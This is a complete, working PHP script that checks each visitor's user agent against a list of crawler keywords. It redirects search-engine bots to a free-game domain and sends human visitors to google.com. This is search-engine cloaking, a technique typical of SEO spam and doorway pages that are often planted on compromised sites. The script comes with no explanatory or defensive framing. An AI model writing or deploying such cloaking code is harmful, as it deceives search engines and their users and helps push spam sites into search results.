<?php
// Get the user agent
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// Define bot keywords
$bots = [
    'googlebot',
    'bingbot',
    'slurp',       // Yahoo
    'duckduckbot',
    'baiduspider',
    'yandex',
    'sogou',
    'exabot',
    'facebot',
    'ia_archiver',
    'crawler',
    'spider',
    'bot',
    'proxy'
];

// Check if the visitor is a bot
$isBot = false;
foreach ($bots as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $isBot = true;
        break;
    }
}

// Redirect based on type
if ($isBot) {
    header("Location: https://redball.freegamehub.us/");
    exit;
} else {
    header("Location: https://www.google.com/");
    exit;
}
?>
